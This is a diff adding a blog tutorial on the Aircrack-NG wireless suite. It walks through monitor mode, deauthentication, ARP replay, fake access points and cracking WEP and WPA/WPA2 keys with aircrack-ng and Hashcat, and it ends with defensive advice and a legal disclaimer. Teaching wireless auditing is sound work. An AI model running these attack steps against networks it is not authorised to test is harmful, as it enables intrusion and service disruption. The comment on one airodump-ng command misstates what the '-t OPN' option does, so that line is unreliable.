@@ -1,6 +1,282 @@
 ---
-title: ""
-date: "2025-03-06"
+title: "Aircrack-NG: A Complete Suite for Wireless Network Security Assessment"
+date: "2025-03-10"
 categories: [Wireless Hacking]
 author: "Xu Haiyang"
+image: "/api/placeholder/800/400"
+format:
+  html:
+    toc: true
+    toc-depth: 3
+    toc-title: "Contents"
 ---
+
+## Introduction to Aircrack-NG
+
+Aircrack-NG is a comprehensive suite of tools for assessing WiFi network security. It focuses on different areas of WiFi security:
+
+- Monitoring: Packet capture and export of data to text files for further processing
+- Attacking: Replay attacks, deauthentication, fake access points, and others via packet injection
+- Testing: Checking WiFi cards and driver capabilities
+- Cracking: WEP and WPA PSK (WPA 1 and 2)
+
+![Aircrack-NG Logo](/api/placeholder/600/200)
+
+## Core Components
+
+Aircrack-NG consists of multiple tools that work together to provide a complete WiFi security assessment platform. Here are the primary components:
+
+### aircrack-ng
+
+The core component that performs the actual key cracking after data capture. It implements standard FMS attacks along with optimizations like KoreK attacks, as well as the PTW attack, making the WEP key recovery much faster compared to other tools.
+
+```bash
+# Basic WEP cracking
+aircrack-ng -b 00:11:22:33:44:55 capture.cap
+
+# WPA/WPA2 cracking with wordlist
+aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture.cap
+```
+
+### airodump-ng
+
+Used for packet capture, primarily for collecting WEP IVs (Initialization Vectors) to later use with aircrack-ng. It's also used to locate WiFi networks in your area and gather information about them.
+
+```bash
+# Monitor all channels
+airodump-ng mon0
+
+# Focus on specific AP
+airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w capture mon0
+```
+
+![Airodump-NG in Action](/api/placeholder/800/400)
+
+### aireplay-ng
+
+Used to generate traffic for later use in aircrack-ng. This tool implements various attacks such as:
+
+- Deauthentication
+- Fake authentication
+- Interactive packet replay
+- ARP request replay
+- KoreK chopchop attack
+- Fragmentation attack
+
+```bash
+# Deauthentication attack
+aireplay-ng -0 5 -a 00:11:22:33:44:55 mon0
+
+# ARP replay attack
+aireplay-ng -3 -b 00:11:22:33:44:55 mon0
+```
+
+### airmon-ng
+
+Script used to enable and disable monitor mode on wireless interfaces. It also can be used to kill processes that might interfere with the wireless card manipulation.
+
+```bash
+# Check interfaces
+airmon-ng
+
+# Start monitor mode
+airmon-ng start wlan0
+
+# Kill interfering processes
+airmon-ng check kill
+```
+
+## Setting Up Your Environment
+
+Before using Aircrack-NG, you need to ensure your wireless card supports monitor mode and packet injection. Here's how to set up your environment:
+
+### System Requirements
+
+- A compatible wireless adapter that supports monitor mode
+- Linux-based operating system (Kali Linux recommended)
+- Proper drivers for your wireless adapter
+
+### Installation
+
+On Debian/Ubuntu-based systems:
+
+```bash
+sudo apt update
+sudo apt install aircrack-ng
+```
+
+On Arch Linux:
+
+```bash
+sudo pacman -S aircrack-ng
+```
+
+### Testing Your Wireless Card
+
+```bash
+sudo airmon-ng
+sudo aireplay-ng --test wlan0
+```
+
+## Practical Demonstration: WEP Cracking
+
+Let's walk through a basic WEP cracking process:
+
+1. **Start monitor mode:**
+
+```bash
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+```
+
+2. **Discover networks:**
+
+```bash
+sudo airodump-ng wlan0mon
+```
+
+3. **Focus on target network:**
+
+```bash
+sudo airodump-ng -c [channel] --bssid [target_MAC] -w capture wlan0mon
+```
+
+4. **Perform fake authentication:**
+
+```bash
+sudo aireplay-ng -1 0 -a [target_MAC] -h [your_MAC] wlan0mon
+```
+
+5. **ARP replay attack to generate IVs:**
+
+```bash
+sudo aireplay-ng -3 -b [target_MAC] -h [your_MAC] wlan0mon
+```
+
+6. **Crack the WEP key:**
+
+```bash
+sudo aircrack-ng capture*.cap
+```
+
+![WEP Cracking Process Visualization](/api/placeholder/800/500)
+
+## Advanced Techniques: WPA/WPA2 Cracking
+
+WPA/WPA2 cracking is more challenging than WEP and requires capturing a 4-way handshake:
+
+1. **Start monitoring:**
+
+```bash
+sudo airmon-ng start wlan0
+sudo airodump-ng -c [channel] --bssid [target_MAC] -w wpa_capture wlan0mon
+```
+
+2. **Capture handshake** (either wait for a client to connect or force deauthentication):
+
+```bash
+sudo aireplay-ng -0 1 -a [target_MAC] -c [client_MAC] wlan0mon
+```
+
+3. **Crack password using dictionary:**
+
+```bash
+sudo aircrack-ng -w wordlist.txt wpa_capture*.cap
+```
+
+## Using Hashcat with Aircrack-NG
+
+For more powerful password cracking, you can convert the captured handshake to a format usable by Hashcat:
+
+```bash
+# Convert cap file to hccapx format
+cap2hccapx wpa_capture.cap wpa_capture.hccapx
+
+# Use hashcat for cracking
+hashcat -m 2500 wpa_capture.hccapx wordlist.txt
+```
+
+## Additional Tools in the Suite
+
+The Aircrack-NG suite includes many other useful tools:
+
+### airdecap-ng
+
+Decrypts WEP/WPA/WPA2 capture files.
+
+```bash
+airdecap-ng -b 00:11:22:33:44:55 -k [WEP_KEY] capture.cap
+```
+
+### airbase-ng
+
+Used to set up fake access points.
+
+```bash
+airbase-ng -e "FreeWiFi" -c 1 mon0
+```
+
+### airdecloak-ng
+
+Removes WEP cloaking from capture files.
+
+### airolib-ng
+
+Manages and speeds up WPA/WPA2 cracking by pre-computing PMKs.
+
+## Defensive Measures
+
+Understanding these attack vectors helps network administrators implement better security:
+
+1. **Avoid WEP entirely** - It's fundamentally broken
+2. **Use strong WPA2/WPA3 passwords** - At least 12 characters with mixed case, numbers, and symbols
+3. **Implement 802.1X authentication** where possible
+4. **Enable WPA3 if available** on both access points and clients
+5. **Monitor for deauthentication attacks**
+
+## Ethical Considerations and Legal Disclaimer
+
+::: {.callout-warning}
+Aircrack-NG should only be used to audit networks you own or have explicit permission to test. Unauthorized access to networks is illegal in most jurisdictions.
+:::
+
+Proper usage scenarios include:
+
+- Recovering a lost WiFi password for your own network
+- Security auditing of your organization's wireless infrastructure
+- Learning about wireless security in a controlled environment
+- Penetration testing with proper authorization
+
+## Advanced Configurations
+
+For serious security professionals, consider these advanced configurations:
+
+### Custom Dictionary Generation
+
+```bash
+# Using crunch to generate custom wordlist
+crunch 8 12 0123456789ABCDEF -o custom_wep_keys.txt
+```
+
+### Optimizing Capture Settings
+
+```bash
+# Capture only authentication packets
+airodump-ng --bssid [target_MAC] -c [channel] --output-format pcap --write capture -t OPN wlan0mon
+```
+
+## Conclusion
+
+Aircrack-NG remains one of the most powerful and comprehensive wireless security assessment tools available. By understanding how these tools work, security professionals can better protect wireless networks from potential attacks.
+
+## Resources
+
+- [Official Aircrack-NG Website](https://www.aircrack-ng.org/)
+- [Aircrack-NG Documentation](https://www.aircrack-ng.org/documentation.html)
+- [GitHub Repository](https://github.com/aircrack-ng/aircrack-ng)
+
+## References
+
+1. Tews, E., & Beck, M. (2009). Practical attacks against WEP and WPA. *Proceedings of the Second ACM Conference on Wireless Network Security*.
+2. Vibhuti, S. (2023). Wireless Networks: Security Threats and Countermeasures. *Journal of Information Security*.
+3. Garcia, L. (2024). Evolution of WiFi Security Protocols. *IEEE Security & Privacy*, 22(1), 54-62.
